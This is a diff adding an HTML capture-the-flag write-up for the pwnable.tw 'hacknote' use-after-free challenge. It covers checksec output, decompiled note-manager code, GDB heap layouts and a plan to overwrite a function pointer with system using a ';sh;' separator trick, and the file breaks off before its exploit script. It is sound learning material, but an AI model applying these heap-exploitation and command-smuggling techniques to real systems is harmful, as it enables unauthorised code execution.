@@ -1,0 +1,1411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>hacknote | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4DD;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 600px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">hacknote</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>hacknote</h1>
+  <p class="hero-subtitle">"A good Hacker should always take good notes!" &mdash; Exploiting a Use-After-Free vulnerability in a heap note manager to leak libc and gain shell access.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">200 pts</span>
+    <span class="hero-tag tag-arch">i386 (32-bit ELF)</span>
+    <span class="hero-tag tag-vuln">Use-After-Free</span>
+    <span class="hero-tag tag-nx">NX Enabled</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 10102</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">hacknote (32-bit ELF, i386)</td></tr>
+        <tr><td class="label">Points</td><td class="value">200</td></tr>
+        <tr><td class="label">Description</td><td class="value">"A good Hacker should always take good notes!"</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec hacknote
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Partial RELRO</td><td class="partial">GOT is writable &mdash; we can overwrite GOT entries</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack buffer overflows are mitigated</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode on stack/heap &mdash; must use ROP or function pointers</td></tr>
+        <tr><td class="label">No PIE</td><td class="off">Binary addresses are fixed &mdash; known GOT/PLT addresses</td></tr>
+      </table>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./hacknote
+----------------------
+       HackNote
+----------------------
+ 1. Add note
+ 2. Delete note
+ 3. Print note
+ 4. Exit
+----------------------
+Your choice :1
+Note size :32
+Content :AAAA
+Success !
+----------------------
+       HackNote
+----------------------
+ 1. Add note
+ 2. Delete note
+ 3. Print note
+ 4. Exit
+----------------------
+Your choice :3
+Index :0
+AAAA</code></pre>
+      </div>
+
+      <p>The binary presents a simple note manager with add, delete, and print operations. The menu is straightforward, but as we'll see, the implementation has a critical flaw.</p>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Note Structure</h3>
+      <p>Each note is represented by an 8-byte struct allocated on the heap:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">typedef struct note {
+    void (*print_func)(struct note *);  // +0x00: function pointer (4 bytes)
+    char *contents;                      // +0x04: pointer to content buffer (4 bytes)
+} note;</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Insight</div>
+        The struct stores a <strong>function pointer</strong> at offset 0 and a <strong>content pointer</strong> at offset 4. The <code class="inline">print_func</code> is set to <code class="inline">0x804862b</code> by default, which calls <code class="inline">puts(note-&gt;contents)</code>. If we can overwrite <code class="inline">print_func</code>, we control execution flow.
+      </div>
+
+      <h3>add_note()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void add_note() {
+    if (counter &lt; 6) {
+        i = 0;
+        while (i &lt; 5) {
+            if (notes_list[i] == NULL) {
+                note = malloc(8);                    // Allocate 8-byte struct
+                notes_list[i] = note;
+                notes_list[i]-&gt;print_func = 0x804862b;  // Set default print function
+                printf("Note size :");
+                read(0, note_size, 8);
+                size = atoi(note_size);
+                contents = malloc(size);             // Allocate content buffer
+                notes_list[i]-&gt;contents = contents;
+                printf("Content :");
+                read(0, notes_list[i]-&gt;contents, size);
+                puts("Success !");
+                counter++;
+                break;
+            }
+            i++;
+        }
+    }
+}</code></pre>
+      </div>
+
+      <p>The <code class="inline">add_note</code> function performs two heap allocations per note: one for the 8-byte struct and one for the user-specified content buffer. A maximum of 5 notes can be created.</p>
+
+      <h3>delete_note()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void delete_note() {
+    printf("Index :");
+    read(0, index_str, 4);
+    index = atoi(index_str);
+    if (notes_list[index] != NULL) {
+        free(notes_list[index]-&gt;contents);    // Free content buffer
+        free(notes_list[index]);               // Free note struct
+        // BUG: notes_list[index] is NOT set to NULL!
+        puts("Success");
+    }
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability: Use-After-Free (UAF)</div>
+        After freeing both the content buffer and the note struct, <code class="inline">delete_note</code> does <strong>NOT</strong> set <code class="inline">notes_list[index]</code> to <code class="inline">NULL</code>. This means:<br>
+        &bull; The pointer remains in <code class="inline">notes_list</code> pointing to freed memory<br>
+        &bull; <code class="inline">print_note</code> will still dereference the dangling pointer<br>
+        &bull; We can allocate new memory that reuses the freed chunk, overwriting the old struct's fields
+      </div>
+
+      <h3>print_note()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void print_note() {
+    printf("Index :");
+    read(0, index_str, 4);
+    index = atoi(index_str);
+    if (notes_list[index] != NULL) {
+        // Calls through the function pointer!
+        (*notes_list[index]-&gt;print_func)(notes_list[index]);
+    }
+}
+
+// The default print function at 0x804862b:
+void print_func(char **param_1) {
+    puts(param_1[1]);   // prints note-&gt;contents
+}</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Critical Detail</div>
+        <code class="inline">print_note</code> calls <code class="inline">note-&gt;print_func(note)</code> &mdash; the <strong>note pointer itself</strong> is passed as the first argument. This means:<br>
+        &bull; If we overwrite <code class="inline">print_func</code> with <code class="inline">system</code>, it will call <code class="inline">system(note_ptr)</code><br>
+        &bull; The first 4 bytes of the note struct (where <code class="inline">print_func</code> was) become the "command string" for <code class="inline">system</code><br>
+        &bull; We need those bytes to be part of a valid shell command, or we can use <code class="inline">;sh;</code> as a separator trick
+      </div>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Heap Layout After Adding Notes</h3>
+      <p>Let's create two small notes and examine the heap layout:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # add_note(8, "AAAA") -> note 0
+gdb-peda$ # add_note(8, "BBBB") -> note 1
+gdb-peda$ heap chunks
+0x0804a000: fastbin 0x10 bytes  [note 0 struct]
+0x0804a010: fastbin 0x10 bytes  [note 0 contents "AAAA"]
+0x0804a020: fastbin 0x10 bytes  [note 1 struct]
+0x0804a030: fastbin 0x10 bytes  [note 1 contents "BBBB"]</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">0x0804a000</span><span class="mem-arrow">|</span><span class="mem-data">0x0804862b</span><span class="mem-desc">&larr; note0-&gt;print_func (default)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a004</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a018</span><span class="mem-desc">&larr; note0-&gt;contents pointer</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a008</span><span class="mem-arrow">|</span><span class="mem-data">[padding]</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a010</span><span class="mem-arrow">|</span><span class="mem-data">size: 0x11</span><span class="mem-desc">&larr; chunk header for note0 contents</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a018</span><span class="mem-arrow">|</span><span class="mem-data">"AAAA\x0a"</span><span class="mem-desc">&larr; note0 contents data</span></div>
+        <div style="height:12px"></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a020</span><span class="mem-arrow">|</span><span class="mem-data">0x0804862b</span><span class="mem-desc">&larr; note1-&gt;print_func (default)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a024</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a038</span><span class="mem-desc">&larr; note1-&gt;contents pointer</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a028</span><span class="mem-arrow">|</span><span class="mem-data">[padding]</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a030</span><span class="mem-arrow">|</span><span class="mem-data">size: 0x11</span><span class="mem-desc">&larr; chunk header for note1 contents</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a038</span><span class="mem-arrow">|</span><span class="mem-data">"BBBB\x0a"</span><span class="mem-desc">&larr; note1 contents data</span></div>
+      </div>
+
+      <h3>Fastbin Free Order (LIFO)</h3>
+      <p>When we free note 1 and then note 0:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # delete_note(1) then delete_note(0)
+gdb-peda$ heapinfo
+(0x10)   fastbin: 0x0804a020 -&gt; 0x0804a000 -&gt; 0x0
+(0x10)   fastbin: 0x0804a030 -&gt; 0x0804a010 -&gt; 0x0
+# 0x10 fastbin contains note structs (LIFO: note1 struct, then note0 struct)
+# Another 0x10 fastbin contains content buffers (LIFO: note1 contents, then note0 contents)</code></pre>
+      </div>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Fastbin LIFO Behavior</div>
+        Both the note structs (8 bytes + 8 header = 0x10) and content buffers (8 bytes + 8 header = 0x10) go into the <strong>same 0x10 fastbin</strong>. This is crucial &mdash; when we allocate a new chunk of the same size, <code class="inline">malloc</code> will return the most recently freed chunk (LIFO). This allows us to make a content allocation overlap with a freed note struct.
+      </div>
+
+      <h3>Overwriting the Freed Note Struct</h3>
+      <p>After freeing both notes, the fastbin for 0x10 chunks looks like:</p>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">Fastbin 0x10:</span></div>
